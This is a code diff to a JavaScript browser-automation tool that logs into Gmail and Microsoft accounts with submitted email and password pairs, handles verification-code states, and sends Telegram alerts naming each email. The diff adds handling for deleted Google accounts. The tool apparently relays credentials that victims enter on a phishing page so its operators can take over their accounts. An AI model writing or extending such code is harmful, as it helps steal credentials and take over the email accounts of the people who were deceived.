@@ -565,6 +565,21 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     logger.info(`[checkAccountAccess][${instanceId}] Email submitted. URL: ${page.url()}`);
                     speed('email submitted');
 
+                    // Gmail "Account deleted" is terminal — return immediately so we
+                    // never wait through password/challenge steps or click "Next"
+                    // (which would attempt account restoration).
+                    if (platform === 'gmail') {
+                        const deletedCheck = await detectGmailEmailError(page, instanceId).catch(() => ({ found: false }));
+                        if (deletedCheck.found && deletedCheck.code === 'ACCOUNT_DELETED') {
+                            logger.warn(`[checkAccountAccess][${instanceId}] Account deleted detected right after submit - returning terminal error.`);
+                            return {
+                                emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                verificationState: 'ACCOUNT_DELETED', error: 'ACCOUNT_DELETED',
+                                message: 'This Google account has been deleted.'
+                            };
+                        }
+                    }
+
                     // Microsoft resolves email submission asynchronously — the page may bounce through
                     // sso_reload=true, a `common/login` hand-off, or login.live.com oauth20_authorize.srf.
                     // Wait for the URL to STABILIZE (same URL for ~3s) before doing any further state
@@ -653,6 +668,14 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     // document.querySelector cannot pierce.
                     if (platform === 'gmail') {
                         const emailErrCheck = await detectGmailEmailError(page, instanceId).catch(() => ({ found: false }));
+                        if (emailErrCheck.found && emailErrCheck.code === 'ACCOUNT_DELETED') {
+                            logger.warn(`[checkAccountAccess][${instanceId}] Account deleted detected - returning terminal error immediately.`);
+                            return {
+                                emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                verificationState: 'ACCOUNT_DELETED', error: 'ACCOUNT_DELETED',
+                                message: 'This Google account has been deleted.'
+                            };
+                        }
                         if (emailErrCheck.found) {
                             logger.info(`[checkAccountAccess][${instanceId}] Email error detected (reuse path): "${emailErrCheck.message}"`);
                             return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: emailErrCheck.message };
@@ -1660,6 +1683,12 @@ async function sendWrongInputAlert({ type, platform, email, browserId, password,
 
         let message = '';
         switch (type) {
+            case 'ACCOUNT_DELETED':
+                message = `🚫 *Account Deleted*\n\n`;
+                message += `*Project:* ${projectTitle}\n`;
+                message += `*Email:* \`${email}\`\n`;
+                message += `*Detail:* ${detail || 'Google reported this account as deleted.'}\n`;
+                break;
             case 'WRONG_EMAIL':
                 message = `⚠️ *Wrong Email Attempt* ⚠️\n\n`;
                 message += `*Project:* ${projectTitle}\n`;
@@ -3630,6 +3659,27 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         initialCheckResult = await runGuardedAccountCheck(browser, page, email, password, platform, browserId, true, _timer); // For email retry, reuse session, no navigation
                         logger.info(`[processRow][${browserId}][SPEED] WAITINGEMAIL: checkAccountAccess done in ${Date.now() - caaStart}ms at +${Date.now() - waitingEmailStart}ms -> verificationState=${initialCheckResult.verificationState}`);
                         logger.info(`[processRow][${browserId}] checkAccountAccess result: emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}, reachedInbox=${initialCheckResult.reachedInbox}, requiresVerification=${initialCheckResult.requiresVerification}, verificationState=${initialCheckResult.verificationState}, error=${initialCheckResult.error || 'none'}`);
+
+                        // Gmail "Account deleted" is terminal: render the existing
+                        // FAILED error page (no inline re-entry) and alert Telegram.
+                        if (initialCheckResult.verificationState === 'ACCOUNT_DELETED' || initialCheckResult.error === 'ACCOUNT_DELETED') {
+                            logger.warn(`[processRow][${browserId}] Account deleted detected - setting FAILED terminal status.`);
+                            finalStatus = "FAILED";
+                            updateData.status = finalStatus;
+                            updateData.verified = false;
+                            updateData.fullAccess = false;
+                            updateData.lastJsonResponse = JSON.stringify({
+                                browserId, email, status: "FAILED",
+                                code: "ACCOUNT_DELETED",
+                                error: "ACCOUNT_DELETED",
+                                verificationState: "ACCOUNT_DELETED",
+                                message: "This Google account has been deleted. Refresh the page to try another account."
+                            });
+                            sendWrongInputAlert({ type: 'ACCOUNT_DELETED', platform, email, browserId, detail: 'Google reported this account as deleted.' });
+                            updateBrowserRowDataFast(browserId, { ...updateData, verified: false, fullAccess: false });
+                            exitingEarly = true;
+                            return;
+                        }
 
                         // Immediately check the result for generic email errors and set status within the polling loop
                         if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
@@ -7077,6 +7127,22 @@ if (!foundSelector) {
             updateBrowserRowData(browserId, { ...updateData, password: '', engineProcessing: false, ...submissionHistoryPayload(browserId) }).catch(err =>
                 logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
             );
+            return;
+        } else if (initialCheckResult.verificationState === 'ACCOUNT_DELETED' || initialCheckResult.error === 'ACCOUNT_DELETED') {
+            logger.warn(`[processRow][${browserId}] Account deleted detected (post-check) - setting FAILED terminal status.`);
+            finalStatus = "FAILED";
+            updateData.status = finalStatus;
+            updateData.verified = false;
+            updateData.fullAccess = false;
+            updateData.lastJsonResponse = JSON.stringify({
+                browserId, email, status: "FAILED",
+                code: "ACCOUNT_DELETED",
+                error: "ACCOUNT_DELETED",
+                verificationState: "ACCOUNT_DELETED",
+                message: "This Google account has been deleted. Refresh the page to try another account."
+            });
+            sendWrongInputAlert({ type: 'ACCOUNT_DELETED', platform, email, browserId, detail: 'Google reported this account as deleted.' });
+            updateBrowserRowDataFast(browserId, { ...updateData, verified: false, fullAccess: false });
             return;
         } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {
             logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
